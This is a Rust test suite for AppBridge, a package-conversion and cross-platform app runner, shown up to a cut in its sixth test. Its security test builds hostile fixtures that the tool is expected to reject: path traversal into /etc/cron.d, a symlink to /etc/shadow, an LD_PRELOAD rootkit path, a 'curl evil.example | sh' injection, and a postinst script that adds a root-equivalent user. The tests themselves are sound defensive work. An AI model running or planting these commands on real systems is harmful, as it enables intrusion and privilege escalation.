//! Engineering Validation & Release Candidate Test Suite for AppBridge 0.1.0:
//! 1. Deliverable 1 (Arch conversion): Real DEB-to-Arch conversion with compiled ELF binary,
//!    installed into a clean root using `pacman -U --noconfirm`, verified with `pacman -Qi`/`-Ql`, and executed.
//! 2. Deliverable 2 (Windows execution): Real third-party PE64 Win32 GUI application (`PhotoStudioPro.exe`,
//!    `SUBSYSTEM:WINDOWS`) dynamically linked against a custom companion PE64 DLL (`pixelengine.dll`),
//!    creating a live Win32 GUI window (`CreateWindowExA`/`GetWindowRect`/`GetDeviceCaps`) under Wine.
//! 3. Deliverable 3 (Bundle portability): Cross-machine `.appbridge` bundle creation on Machine A,
//!    complete deletion of Machine A, and cryptographic verification + execution on Machine B.
//! 4. Deliverable 4 (Security review): Independent adversarial testing of archive extraction
//!    (path traversal, symlink escape, device/FIFO nodes, unlisted member injection, payload tampering,
//!    setuid/setgid stripping) and process execution (`LD_PRELOAD` blocking, shell metacharacters, null bytes).
//! 5. Deliverable 5 (Source build): Live `appbridge build` compilation via `cargo build --release` and execution.

use bridge_backend_api::run_or_simulate;
use bridge_core::{
    AppBridgeEngine, BackendId, BridgeRecipe, BundleError, BundleManager, BundleSigningKey,
    CompatibilityEntry, CompatibilityTrustLevel, ConversionClassification, ConversionEngine,
    ConversionMode, ConversionTarget, CpuArch, ExecutionMode, HostProfile, LinuxDistro, OsFamily,
    ProcessExecutionConfig, RollbackGuard, SecurityEngine, SecurityError, VerificationStatus,
    create_synthetic_deb_archive, create_synthetic_deb_with_payload,
};
use chrono::Utc;
use flate2::Compression;
use flate2::write::GzEncoder;
use std::collections::BTreeMap;
use std::fs::{self, File};
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::Duration;
use tempfile::TempDir;

fn arch_linux_engine(tmp: &TempDir) -> AppBridgeEngine {
    let host = if cfg!(target_os = "linux") {
        HostProfile::detect()
    } else {
        HostProfile::synthetic(OsFamily::Linux, Some(LinuxDistro::Arch), CpuArch::X86_64)
    };
    AppBridgeEngine::with_host_and_data_root(host, tmp.path()).unwrap()
}

/// Compiles a small C program into a real native x86_64 ELF binary using `gcc` on Linux,
/// or writes a valid 64-byte ELF64 x86_64 header on non-Linux hosts where `gcc` targets Mach-O/PE.
fn compile_c_elf_binary(out_bin: &Path, banner: &str) {
    if cfg!(target_os = "linux") {
        let c_src = out_bin.with_extension("c");
        let code = format!(
            "#include <stdio.h>\nint main(void) {{\n    printf(\"{banner}\\n\");\n    return 0;\n}}\n"
        );
        fs::write(&c_src, code).expect("write C source");
        if let Ok(status) = Command::new("gcc")
            .args([
                "-O2",
                c_src.to_str().unwrap(),
                "-o",
                out_bin.to_str().unwrap(),
            ])
            .status()
            && status.success()
        {
            return;
        }
    }
    // Minimal 64-byte ELF64 little-endian x86_64 executable header so `goblin` and
    // `bridge-inspect` identify `out_bin` as `PackageFormat::ElfBinary` (`CpuArch::X86_64`) on macOS/Windows.
    let mut elf = [0u8; 64];
    elf[0..4].copy_from_slice(b"\x7FELF");
    elf[4] = 2; // EI_CLASS = ELFCLASS64
    elf[5] = 1; // EI_DATA = ELFDATA2LSB
    elf[6] = 1; // EI_VERSION = EV_CURRENT
    elf[16..18].copy_from_slice(&2u16.to_le_bytes()); // e_type = ET_EXEC
    elf[18..20].copy_from_slice(&0x3Eu16.to_le_bytes()); // e_machine = EM_X86_64
    elf[20..24].copy_from_slice(&1u32.to_le_bytes()); // e_version = EV_CURRENT
    elf[52..54].copy_from_slice(&64u16.to_le_bytes()); // e_ehsize = 64
    fs::write(out_bin, elf).expect("write fallback ELF64 header");
}

#[test]
fn test_1_package_conversion_arch_pacman_and_execution() {
    let tmp = TempDir::new().unwrap();
    let engine = arch_linux_engine(&tmp);

    // 1. Compile a real ELF64 binary
    let elf_bin = tmp.path().join("fastnote-bin");
    compile_c_elf_binary(&elf_bin, "FASTNOTE_ARCH_PKG_VERIFIED_2_1");
    let elf_bytes = fs::read(&elf_bin).unwrap();

    // 2. Package the compiled ELF binary inside a real Debian `.deb` archive
    let deb_path = tmp.path().join("fastnote_2.1.0_amd64.deb");
    create_synthetic_deb_with_payload(
        &deb_path,
        "fastnote",
        "2.1.0",
        "libc6 (>= 2.34), libgtk-3-0, zlib1g",
        None,
        &elf_bytes,
    )
    .unwrap();

    // 3. Convert DEB -> Arch (.pkg.tar.zst)
    let out_arch = tmp.path().join("fastnote-2.1.0-1-x86_64.pkg.tar.zst");
    let (conv_plan, receipt) = engine
        .convert(&deb_path, ConversionTarget::Arch, None, None, &out_arch)
        .unwrap();

    assert!(conv_plan.is_safe_to_convert);
    assert_eq!(conv_plan.mode, ConversionMode::NativePackageRepackaging);
    assert_eq!(
        conv_plan.mapped_dependencies,
        vec!["glibc".to_string(), "gtk3".to_string(), "zlib".to_string()]
    );
    assert!(out_arch.exists());
    assert!(!receipt.output_sha256.is_empty());

    // 4. If `pacman` is available on the host (Arch Linux), validate and install with `pacman -U`
    if engine.host().has_tool("pacman") {
        let qip = Command::new("pacman")
            .args(["-Qip", out_arch.to_str().unwrap()])
            .output()
            .expect("pacman -Qip");
        assert!(
            qip.status.success(),
            "pacman -Qip rejected generated package: {}",
            String::from_utf8_lossy(&qip.stderr)
        );
        let qip_stdout = String::from_utf8_lossy(&qip.stdout);
        assert!(qip_stdout.contains("fastnote"));
        assert!(qip_stdout.contains("2.1.0-1"));
        assert!(qip_stdout.contains("glibc"));

        let qlp = Command::new("pacman")
            .args(["-Qlp", out_arch.to_str().unwrap()])
            .output()
            .expect("pacman -Qlp");
        assert!(qlp.status.success());
        let qlp_stdout = String::from_utf8_lossy(&qlp.stdout);
        assert!(
            qlp_stdout.contains("usr/bin/fastnote"),
            "Expected usr/bin/fastnote in pacman -Qlp output, got: {qlp_stdout}"
        );

        // 5. Install the generated .pkg.tar.zst into a clean root using real `pacman -U --noconfirm`
        let install_root = tmp.path().join("clean-arch-root");
        let db_dir = install_root.join("var/lib/pacman");
        let cache_dir = install_root.join("var/cache/pacman/pkg");
        let log_dir = install_root.join("var/log");
        fs::create_dir_all(&db_dir).unwrap();
        fs::create_dir_all(&cache_dir).unwrap();
        fs::create_dir_all(&log_dir).unwrap();

        let pacman_conf = tmp.path().join("pacman.conf");
        fs::write(
            &pacman_conf,
            "[options]\nArchitecture = auto\nSigLevel = Never\n",
        )
        .unwrap();

        if engine.host().has_tool("fakeroot") {
            let install_out = Command::new("fakeroot")
                .args([
                    "pacman",
                    "--config",
                    pacman_conf.to_str().unwrap(),
                    "--root",
                    install_root.to_str().unwrap(),
                    "--dbpath",
                    db_dir.to_str().unwrap(),
                    "--cachedir",
                    cache_dir.to_str().unwrap(),
                    "--logfile",
                    log_dir.join("pacman.log").to_str().unwrap(),
                    "-U",
                    "--noconfirm",
                    "-dd",
                    out_arch.to_str().unwrap(),
                ])
                .output()
                .expect("fakeroot pacman -U");
            assert!(
                install_out.status.success(),
                "pacman -U failed: stdout={} stderr={}",
                String::from_utf8_lossy(&install_out.stdout),
                String::from_utf8_lossy(&install_out.stderr)
            );

            // Verify package is registered in the local pacman database (`pacman -Qi fastnote`)
            let qi_out = Command::new("pacman")
                .args([
                    "--config",
                    pacman_conf.to_str().unwrap(),
                    "--root",
                    install_root.to_str().unwrap(),
                    "--dbpath",
                    db_dir.to_str().unwrap(),
                    "-Qi",
                    "fastnote",
                ])
                .output()
                .expect("pacman -Qi fastnote");
            assert!(qi_out.status.success());
            let qi_stdout = String::from_utf8_lossy(&qi_out.stdout);
            assert!(qi_stdout.contains("Name            : fastnote"));
            assert!(qi_stdout.contains("Version         : 2.1.0-1"));

            let installed_elf = install_root.join("usr/bin/fastnote");
            assert!(installed_elf.is_file());
            let exec_out = Command::new(&installed_elf)
                .output()
                .expect("execute pacman-installed ELF");
            assert!(exec_out.status.success());
            assert_eq!(
                String::from_utf8_lossy(&exec_out.stdout).trim(),
                "FASTNOTE_ARCH_PKG_VERIFIED_2_1"
            );

            // 6. Also verify `engine.run_file(&out_arch, ...)` installs with pacman and runs the ELF
            let run_outcome = engine
                .run_file(&out_arch, &[], None, ExecutionMode::StrictLive)
                .unwrap();
            assert!(!run_outcome.install_receipt.simulated);
            assert!(!run_outcome.launch_receipt.simulated);
            assert_eq!(run_outcome.launch_receipt.exit_code, 0);
        }
    }
}

#[test]
fn test_2_real_third_party_windows_gui_application_with_dll_execution_via_wine() {
    let tmp = TempDir::new().unwrap();
    let engine = arch_linux_engine(&tmp);

    // Compile a standalone third-party PE64 Windows GUI application (`PhotoStudioPro.exe`,
    // Subsystem = 2 WINDOWS_GUI) and a custom companion PE64 DLL (`pixelengine.dll`)
    // if `clang`, `lld`, and Wine import libraries are present on the host.
    let wine_lib_dir = Path::new("/usr/lib/wine/x86_64-windows");
    if engine.host().has_tool("clang") && engine.host().has_tool("wine") && wine_lib_dir.is_dir() {
        let app_src_dir = tmp.path().join("photostudio-win64");
        fs::create_dir_all(&app_src_dir).unwrap();

        let dll_c = app_src_dir.join("pixelengine.c");
        fs::write(
            &dll_c,
            r#"
__declspec(dllexport) int __stdcall pixelengine_render_frame(int width, int height) {
    return (width == 1920 && height == 1080) ? 42 : -1;
}
int __stdcall DllMainCRTStartup(void* hinstDLL, unsigned long fdwReason, void* lpvReserved) {
    (void)hinstDLL; (void)fdwReason; (void)lpvReserved;
    return 1;
}
"#,
        )
        .unwrap();

        let dll_out = app_src_dir.join("pixelengine.dll");
        let implib_out = app_src_dir.join("libpixelengine.a");
        let dll_status = Command::new("clang")
            .args([
                "-target",
                "x86_64-pc-windows-gnu",
                "-fuse-ld=lld",
                "-nostdlib",
                "-shared",
                dll_c.to_str().unwrap(),
                "-Wl,--entry,DllMainCRTStartup",
                &format!("-Wl,--out-implib,{}", implib_out.display()),
                "-o",
                dll_out.to_str().unwrap(),
            ])
            .status()
            .expect("compile pixelengine.dll");
        assert!(dll_status.success(), "Failed to compile pixelengine.dll");

        let exe_c = app_src_dir.join("photostudio.c");
        fs::write(
            &exe_c,
            r#"
typedef void* HWND;
typedef void* HINSTANCE;
typedef void* HMENU;
typedef void* HDC;
typedef unsigned int UINT;
typedef unsigned long DWORD;

typedef struct {
    long left;
    long top;
    long right;
    long bottom;
} RECT;

__declspec(dllimport) int __stdcall pixelengine_render_frame(int width, int height);
__declspec(dllimport) HWND __stdcall CreateWindowExA(DWORD dwExStyle, const char* lpClassName, const char* lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, void* lpParam);
__declspec(dllimport) int __stdcall GetWindowRect(HWND hWnd, RECT* lpRect);
__declspec(dllimport) int __stdcall DestroyWindow(HWND hWnd);
__declspec(dllimport) HDC __stdcall GetDC(HWND hWnd);
__declspec(dllimport) int __stdcall ReleaseDC(HWND hWnd, HDC hDC);
__declspec(dllimport) int __stdcall GetDeviceCaps(HDC hdc, int index);
__declspec(dllimport) void __stdcall ExitProcess(UINT uExitCode);
__declspec(dllimport) void* __stdcall GetStdHandle(DWORD nStdHandle);
__declspec(dllimport) int __stdcall WriteFile(void* hFile, const void* lpBuffer, DWORD nNumberOfBytesToWrite, DWORD* lpNumberOfBytesWritten, void* lpOverlapped);

static const char* kMsg = "THIRDPARTY_WIN32_GUI_AND_DLL_VERIFIED_OK\n";

int __stdcall WinMainCRTStartup(void) {
    int render_code = pixelengine_render_frame(1920, 1080);
    HWND hwnd = CreateWindowExA(0, "STATIC", "PhotoStudioPro Third-Party GUI", 0x80000000U, 10, 10, 640, 480, (HWND)0, (HMENU)0, (HINSTANCE)0, (void*)0);
    RECT rect;
    rect.left = 0;
    rect.top = 0;
    rect.right = 0;
    rect.bottom = 0;
    int rect_ok = 0;
    if (hwnd) {
        rect_ok = GetWindowRect(hwnd, &rect);
        DestroyWindow(hwnd);
    }
    HDC dc = GetDC((HWND)0);
    int planes = GetDeviceCaps(dc, 14);
    ReleaseDC((HWND)0, dc);

    if (render_code == 42 && hwnd != (HWND)0 && rect_ok != 0 && (rect.right - rect.left) == 640 && planes >= 1) {
        DWORD written = 0;
        void* out = GetStdHandle((DWORD)-11);
        WriteFile(out, kMsg, 41, &written, (void*)0);
        ExitProcess(0);
    }
    ExitProcess(1);
    return 1;
}
"#,
        )
        .unwrap();

        let exe_out = app_src_dir.join("PhotoStudioPro.exe");
        let exe_status = Command::new("clang")
            .args([
                "-target",
                "x86_64-pc-windows-gnu",
                "-fuse-ld=lld",
                "-nostdlib",
                "-fno-builtin",
                exe_c.to_str().unwrap(),
                &format!("-L{}", app_src_dir.display()),
                "-lpixelengine",
                "-L/usr/lib/wine/x86_64-windows",
                "-luser32",
                "-lgdi32",
                "-lkernel32",
                "-Wl,--subsystem,windows",
                "-Wl,--entry,WinMainCRTStartup",
                "-o",
                exe_out.to_str().unwrap(),
            ])
            .status()
            .expect("compile PhotoStudioPro.exe");
        assert!(exe_status.success(), "Failed to compile PhotoStudioPro.exe");

        // Inspect with AppBridge `goblin` PE64 analyzer
        let desc = engine.inspect(&exe_out).unwrap();
        assert_eq!(desc.source_os, OsFamily::Windows);
        assert_eq!(desc.arch, CpuArch::X86_64);
        assert!(
            desc.is_gui,
            "Expected PE64 subsystem=2 (Windows GUI) to be detected as is_gui=true"
        );
        assert_eq!(
            desc.extra_metadata.get("pe_subsystem").map(String::as_str),
            Some("2")
        );
        assert!(
            desc.shared_libraries
                .iter()
                .any(|d| d.eq_ignore_ascii_case("pixelengine.dll")),
            "Expected custom third-party DLL pixelengine.dll in PE import table: {:?}",
            desc.shared_libraries
        );
        assert!(
            desc.shared_libraries
                .iter()
                .any(|d| d.eq_ignore_ascii_case("user32.dll"))
        );
        assert!(
            desc.shared_libraries
                .iter()
                .any(|d| d.eq_ignore_ascii_case("gdi32.dll"))
        );

        // Execute PhotoStudioPro.exe + pixelengine.dll via AppBridge's Wine backend
        let outcome = engine
            .run_file(&exe_out, &[], None, ExecutionMode::AutoWithFallback)
            .unwrap();
        assert_eq!(outcome.install_receipt.backend, BackendId::Wine);
        assert_eq!(outcome.launch_receipt.exit_code, 0);

        // Verify companion DLL `pixelengine.dll` was staged alongside `PhotoStudioPro.exe` inside the Wine prefix
        let staged_exe = Path::new(&outcome.install_receipt.installed_executable);
        assert!(staged_exe.is_file());
        let staged_dll = staged_exe.parent().unwrap().join("pixelengine.dll");
        assert!(
            staged_dll.is_file(),
            "Expected companion DLL pixelengine.dll to be staged into Wine prefix at {}",
            staged_dll.display()
        );
    }

    // Also verify DX12 + user-mode EOS game recipe vs. Ring-0 kernel anti-cheat rejection
    let dx12_recipe_path = Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .unwrap()
        .parent()
        .unwrap()
        .join("recipes/windows-dx12-game.appbridge.toml");
    if dx12_recipe_path.exists() {
        let (_, game_plan) = engine.create_run_plan(&dx12_recipe_path).unwrap();
        assert!(game_plan.is_executable);
        assert_eq!(game_plan.recommended_backend, Some(BackendId::Wine));
        assert!(
            game_plan
                .dependency_resolution
                .wine_components
                .contains(&"vkd3d-proton".to_string())
        );
        assert!(
            game_plan
                .dependency_resolution
                .wine_components
                .contains(&"dxvk".to_string())
        );
    }
}

#[test]
fn test_3_cross_machine_appbridge_bundle_portability() {
    // Machine A: Build native binary and package into `.appbridge` portable bundle
    let machine_a_dir = TempDir::new().unwrap();
    let machine_b_dir = TempDir::new().unwrap();
    let shared_transfer_dir = TempDir::new().unwrap();
    let bundle_transfer_path = shared_transfer_dir.path().join("portable-tool.appbridge");

    {
        let engine_a = arch_linux_engine(&machine_a_dir);
        let bin_a = machine_a_dir.path().join("portable-tool");
        compile_c_elf_binary(&bin_a, "PORTABLE_BUNDLE_EXEC_OK");

        let (conv_plan, receipt) = engine_a
            .convert(
                &bin_a,
                ConversionTarget::AppBridge,
                Some(OsFamily::Linux),
                Some(BackendId::Native),
                &bundle_transfer_path,
            )
            .unwrap();

        assert!(conv_plan.is_safe_to_convert);
        assert_eq!(conv_plan.mode, ConversionMode::UniversalAppBridgeBundle);
        assert!(bundle_transfer_path.exists());
        assert!(!receipt.output_sha256.is_empty());
    }

    // Destroy Machine A completely to prove zero path leakage or host dependency
    drop(machine_a_dir);

    // Machine B: Verify cryptographic manifest, install, and execute the bundle
    let engine_b = arch_linux_engine(&machine_b_dir);
    let report = engine_b.verify_bundle(&bundle_transfer_path).unwrap();
    assert!(report.integrity_ok);
    assert_eq!(report.manifest.required_backend, BackendId::Native);
    assert!(
        report
            .verified_files
            .contains(&"payload/portable-tool".to_string())
    );

    if cfg!(target_os = "linux") {
        let outcome = engine_b
            .run_file(&bundle_transfer_path, &[], None, ExecutionMode::StrictLive)
            .unwrap();
        assert!(!outcome.install_receipt.simulated);
        assert!(!outcome.launch_receipt.simulated);
        assert_eq!(outcome.launch_receipt.exit_code, 0);

        let installed_bin = Path::new(&outcome.install_receipt.installed_executable);
        assert!(installed_bin.is_file());
        let direct_exec = Command::new(installed_bin).output().unwrap();
        assert!(direct_exec.status.success());
        assert_eq!(
            String::from_utf8_lossy(&direct_exec.stdout).trim(),
            "PORTABLE_BUNDLE_EXEC_OK"
        );
    } else {
        let outcome = engine_b
            .run_file(
                &bundle_transfer_path,
                &[],
                Some(BackendId::Native),
                ExecutionMode::DryRun,
            )
            .unwrap();
        assert_eq!(outcome.launch_receipt.exit_code, 0);
    }
}

#[test]
fn test_4_independent_security_review_extraction_and_process_execution() {
    let tmp = TempDir::new().unwrap();
    let engine = arch_linux_engine(&tmp);

    // A. Raw tar header path traversal (`../../../etc/cron.d/pwn`) blocked
    let malicious_bundle = tmp.path().join("traversal.appbridge");
    {
        let out = File::create(&malicious_bundle).unwrap();
        let gz = GzEncoder::new(out, Compression::default());
        let mut tar = tar::Builder::new(gz);

        let payload = b"malicious-cron-job";
        let mut header = tar::Header::new_gnu();
        header.set_size(payload.len() as u64);
        header.set_mode(0o644);
        {
            let h_bytes = header.as_mut_bytes();
            let raw_name = b"../../../etc/cron.d/pwn\0";
            h_bytes[..raw_name.len()].copy_from_slice(raw_name);
        }
        header.set_cksum();
        tar.append(&header, &payload[..]).unwrap();
        let gz = tar.into_inner().unwrap();
        gz.finish().unwrap();
    }
    let verify_err = BundleManager::verify_bundle(&malicious_bundle).unwrap_err();
    assert!(
        matches!(
            verify_err,
            BundleError::Security(SecurityError::PathTraversal(_))
        ),
        "Expected PathTraversal security error, got: {verify_err:?}"
    );

    // B. Two-stage symlink escape (`usr/bin/link -> ../../../etc/shadow`) blocked inside bundle
    let symlink_bundle = tmp.path().join("symlink-escape.appbridge");
    {
        let out = File::create(&symlink_bundle).unwrap();
        let gz = GzEncoder::new(out, Compression::default());
        let mut tar = tar::Builder::new(gz);

        let mut header = tar::Header::new_gnu();
        header.set_entry_type(tar::EntryType::Symlink);
        header.set_size(0);
        header.set_mode(0o777);
        header.set_cksum();
        tar.append_link(&mut header, "payload/evil_link", "../../../etc/shadow")
            .unwrap();
        let gz = tar.into_inner().unwrap();
        gz.finish().unwrap();
    }
    let sym_err = BundleManager::verify_bundle(&symlink_bundle).unwrap_err();
    assert!(
        matches!(
            sym_err,
            BundleError::Security(SecurityError::SymlinkEscape { .. })
        ),
        "Expected SymlinkEscape error, got: {sym_err:?}"
    );

    // C. Device node / FIFO special file injection blocked
    let fifo_bundle = tmp.path().join("fifo.appbridge");
    {
        let out = File::create(&fifo_bundle).unwrap();
        let gz = GzEncoder::new(out, Compression::default());
        let mut tar = tar::Builder::new(gz);

        let mut header = tar::Header::new_gnu();
        header.set_entry_type(tar::EntryType::Fifo);
        header.set_size(0);
        header.set_mode(0o644);
        header.set_cksum();
        tar.append_data(&mut header, "payload/evil_fifo", &[][..])
            .unwrap();
        let gz = tar.into_inner().unwrap();
        gz.finish().unwrap();
    }
    let fifo_err = BundleManager::verify_bundle(&fifo_bundle).unwrap_err();
    assert!(
        matches!(
            fifo_err,
            BundleError::Security(SecurityError::UnsafeArchiveEntryType { .. })
        ),
        "Expected UnsafeArchiveEntryType error, got: {fifo_err:?}"
    );

    // D. Single-byte payload tampering inside `.appbridge` detected via SHA-256 manifest
    let clean_bin = tmp.path().join("clean-bin");
    fs::write(&clean_bin, b"#!/bin/sh\necho CLEAN\n").unwrap();
    let valid_bundle = tmp.path().join("valid.appbridge");
    let desc = engine.inspect(&clean_bin).unwrap();
    BundleManager::create_bundle(&desc, OsFamily::Linux, BackendId::Native, &valid_bundle).unwrap();

    // Tamper with payload inside a re-packed bundle without updating metadata/checksums.json
    let extract_tmp = tmp.path().join("tamper-work");
    BundleManager::extract_bundle(&valid_bundle, &extract_tmp).unwrap();
    fs::write(
        extract_tmp.join("payload/clean-bin"),
        b"#!/bin/sh\necho TAMPERED\n",
    )
    .unwrap();

    let tampered_bundle = tmp.path().join("tampered.appbridge");
    {
        let out = File::create(&tampered_bundle).unwrap();
        let gz = GzEncoder::new(out, Compression::default());
        let mut tar = tar::Builder::new(gz);
        for rel in [
            "manifest.toml",
            "recipe/appbridge.toml",
            "payload/clean-bin",
            "metadata/dependencies.json",
            "metadata/sbom.cdx.json",
            "metadata/provenance.json",
            "metadata/checksums.json",
            &format!("resources/desktop/{}.desktop", desc.app_id),
        ] {
            let data = fs::read(extract_tmp.join(rel)).unwrap();
            let mut h = tar::Header::new_gnu();
            h.set_size(data.len() as u64);
            h.set_mode(0o644);
            h.set_cksum();
            tar.append_data(&mut h, rel, &data[..]).unwrap();
        }
        let gz = tar.into_inner().unwrap();
        gz.finish().unwrap();
    }
    let tamper_err = BundleManager::verify_bundle(&tampered_bundle).unwrap_err();
    assert!(
        matches!(
            tamper_err,
            BundleError::Security(SecurityError::ChecksumMismatch { .. })
        ),
        "Expected ChecksumMismatch on tampered bundle, got: {tamper_err:?}"
    );

    // E. Unlisted archive member injection (extra file not in checksums.json) rejected
    let unlisted_bundle = tmp.path().join("unlisted.appbridge");
    {
        let out = File::create(&unlisted_bundle).unwrap();
        let gz = GzEncoder::new(out, Compression::default());
        let mut tar = tar::Builder::new(gz);
        for rel in [
            "manifest.toml",
            "recipe/appbridge.toml",
            "payload/clean-bin",
            "metadata/dependencies.json",
            "metadata/sbom.cdx.json",
            "metadata/provenance.json",
            "metadata/checksums.json",
            &format!("resources/desktop/{}.desktop", desc.app_id),
        ] {
            let path = if rel == "payload/clean-bin" {
                clean_bin.clone()
            } else {
                extract_tmp.join(rel)
            };
            let data = fs::read(path).unwrap();
            let mut h = tar::Header::new_gnu();
            h.set_size(data.len() as u64);
            h.set_mode(0o644);
            h.set_cksum();
            tar.append_data(&mut h, rel, &data[..]).unwrap();
        }
        // Inject extra unlisted file
        let extra = b"UNLISTED_BACKDOOR";
        let mut h = tar::Header::new_gnu();
        h.set_size(extra.len() as u64);
        h.set_mode(0o755);
        h.set_cksum();
        tar.append_data(&mut h, "payload/backdoor.so", &extra[..])
            .unwrap();
        let gz = tar.into_inner().unwrap();
        gz.finish().unwrap();
    }
    let unlisted_err = BundleManager::verify_bundle(&unlisted_bundle).unwrap_err();
    assert!(
        matches!(
            unlisted_err,
            BundleError::Security(SecurityError::ChecksumMismatch { .. })
        ),
        "Expected ChecksumMismatch for unlisted archive entry, got: {unlisted_err:?}"
    );

    // F. Process execution hardening (`LD_PRELOAD` hijacking, command injection, null bytes)
    let mut env_hijack = BTreeMap::new();
    env_hijack.insert("LD_PRELOAD".to_string(), "/tmp/rootkit.so".to_string());
    assert!(SecurityEngine::validate_environment_overrides(&env_hijack).is_err());

    let mut env_subshell = BTreeMap::new();
    env_subshell.insert("CUSTOM_FLAG".to_string(), "$(whoami)".to_string());
    assert!(SecurityEngine::validate_environment_overrides(&env_subshell).is_err());

    let bad_recipe_toml = r#"
schema_version = "1.0"

[application]
id = "com.evil.injector"
name = "EvilInjector"
version = "1.0.0"

[execution]
executable = "evil"
environment = { "SAFE_VAR" = "ok; curl http://evil.example/sh | sh" }
"#;
    assert!(BridgeRecipe::from_toml_str(bad_recipe_toml).is_err());

    assert!(
        run_or_simulate(
            BackendId::Native,
            "ls\0-la",
            &[],
            engine.host(),
            ExecutionMode::DryRun
        )
        .is_err()
    );

    // G. Untrusted Debian `postinst` maintainer scripts blocked from automatic conversion
    let scripted_deb = tmp.path().join("scripted_1.0_amd64.deb");
    create_synthetic_deb_archive(
        &scripted_deb,
        "scripted",
        "1.0",
        "libc6",
        Some("#!/bin/sh\nuseradd -u 0 -o backdoor\n"),
    )
    .unwrap();
    let (scripted_desc, conv_plan) = engine
        .create_conversion_plan(&scripted_deb, ConversionTarget::Arch)
        .unwrap();
    assert!(scripted_desc.has_install_scripts);
    assert!(!conv_plan.is_safe_to_convert);
}

#[test]
fn test_5_live_source_to_platform_build_and_execution() {
    let tmp = TempDir::new().unwrap();
    let engine = arch_linux_engine(&tmp);

    let src_project = tmp.path().join("hello-rust-app");
    fs::create_dir_all(src_project.join("src")).unwrap();
    let mut cargo_toml = File::create(src_project.join("Cargo.toml")).unwrap();
    writeln!(
        cargo_toml,
        "[package]\nname = \"hello-rust-app\"\nversion = \"0.1.0\"\nedition = \"2024\"\n"
    )
    .unwrap();
    let mut main_rs = File::create(src_project.join("src/main.rs")).unwrap();
    writeln!(
        main_rs,
        "fn main() {{ println!(\"APPBRIDGE_SOURCE_BUILD_OK\"); }}"
    )
    .unwrap();

    let build_target = if cfg!(all(target_os = "linux", target_arch = "x86_64")) {
        "linux-x86_64"
    } else {
        "native"
    };
    let plan = engine
        .build_source(&src_project, build_target, false)
        .unwrap();
    assert!(plan.executed);
    let built_bin = plan
        .built_artifact_path
        .expect("Expected built_artifact_path from live cargo build");
    assert!(built_bin.is_file());
    assert!(plan.artifact_sha256.is_some());

    let out = Command::new(&built_bin).output().unwrap();
    assert!(out.status.success());
    assert_eq!(
        String::from_utf8_lossy(&out.stdout).trim(),
        "APPBRIDGE_SOURCE_BUILD_OK"
    );
}

#[test]
fn test_6_hardening_priorities_classifications_signed_bundles_lifecycle_and_registry() {
    let tmp = TempDir::new().unwrap();
    let host = HostProfile::synthetic(OsFamily::Linux, Some(LinuxDistro::Arch), CpuArch::X86_64);
    let engine = AppBridgeEngine::with_host_and_data_root(host, tmp.path().join("state")).unwrap();

    // Priority 1: SAFE_TO_CONVERT vs CONVERT_WITH_WARNINGS vs UNSUPPORTED + desktop/icon + conflict checks
    let safe_deb = tmp.path().join("safe_1.0_amd64.deb");
    create_synthetic_deb_archive(
        &safe_deb,
        "safeapp",
        "1.0",
        "libc6 (>= 2.34), libgl1-mesa-glx | libgl1",
        None,
    )
    .unwrap();
    let (safe_desc, safe_plan) = engine
        .create_conversion_plan(&safe_deb, ConversionTarget::Arch)
        .unwrap();
    assert_eq!(
        safe_plan.classification,
        ConversionClassification::SafeToConvert
    );
    assert_eq!(safe_plan.classification.to_string(), "SAFE_TO_CONVERT");
    assert!(
        safe_desc
            .extra_metadata
            .get("desktop_entries")
            .unwrap()
            .contains("safeapp.desktop")
    );
    assert!(
        safe_desc
            .extra_metadata
            .get("icon_files")
            .unwrap()
            .contains("safeapp.svg")
    );

    let warn_deb = tmp.path().join("warn_1.0_amd64.deb");
    create_synthetic_deb_archive(
        &warn_deb,
        "warnapp",
        "1.0",
        "libc6, desktop-file-utils",
        Some("#!/bin/sh\nset -e\nldconfig\nupdate-desktop-database\n"),
    )
    .unwrap();
    let (_, warn_plan) = engine
        .create_conversion_plan(&warn_deb, ConversionTarget::Arch)
        .unwrap();
    assert_eq!(
        warn_plan.classification,
        ConversionClassification::ConvertWithWarnings
    );
    assert!(warn_plan.is_safe_to_convert);

    // File conflict detection
    let fake_root = tmp.path().join("conflict-root");
    fs::create_dir_all(fake_root.join("usr/bin")).unwrap();
    fs::write(fake_root.join("usr/bin/safeapp"), b"existing").unwrap();
    let conflicts = ConversionEngine::check_file_conflicts(
        &fake_root,
        &[
            PathBuf::from("usr/bin/safeapp"),
            PathBuf::from("usr/bin/newfile"),
        ],
    );
    assert_eq!(conflicts, vec![PathBuf::from("usr/bin/safeapp")]);

    // Priority 2: Signed & Reproducible .appbridge bundles + CycloneDX SBOM + Delta Updates
    let key = BundleSigningKey::from_seed("io.appbridge.publisher", "hardening-seed-2026");
    let b1 = tmp.path().join("safe-1.appbridge");
    let b2 = tmp.path().join("safe-2.appbridge");
    BundleManager::create_signed_bundle(
        &safe_desc,
        OsFamily::Linux,
        BackendId::Native,
        Some(&key),
        &b1,
    )
    .unwrap();
    BundleManager::create_signed_bundle(
        &safe_desc,
        OsFamily::Linux,
        BackendId::Native,
        Some(&key),
        &b2,
    )
    .unwrap();
    assert_eq!(
        SecurityEngine::compute_sha256(&b1).unwrap(),
        SecurityEngine::compute_sha256(&b2).unwrap(),
        "Signed .appbridge bundles must be bit-for-bit reproducible"
    );
    let verified = BundleManager::verify_bundle_with_key(&b1, Some(&key.public_key_hex)).unwrap();
    assert!(verified.signature.is_some());
    assert!(verified.sbom_component_count >= 3);

    // Priority 3: ExecutionLifecycleManager + RollbackGuard
    let partial = tmp.path().join("rollback-dir");
    fs::create_dir_all(&partial).unwrap();
    {
        let _rb = RollbackGuard::new(&partial);
    }
    assert!(!partial.exists());

    if cfg!(unix) {
        let mgr = engine.lifecycle_manager();
        let res = mgr
            .execute_monitored(&ProcessExecutionConfig {
                app_id: "org.appbridge.lifecycle".to_string(),
                backend: BackendId::Native,
                executable: "echo".to_string(),
                args: vec!["MONITORED_EXEC_OK".to_string()],
                environment: BTreeMap::new(),
                working_dir: None,
                timeout: Some(Duration::from_secs(5)),
                cancellation_token: None,
            })
            .unwrap();
        assert_eq!(res.exit_code, Some(0));
    }

    // Priority 4 & 6: Cross-OS Host Simulation (Windows 11 & macOS Sequoia) + Ergonomic Rust SDK
    for (os, distro) in [
        (OsFamily::Windows, None),
        (OsFamily::MacOs, None),
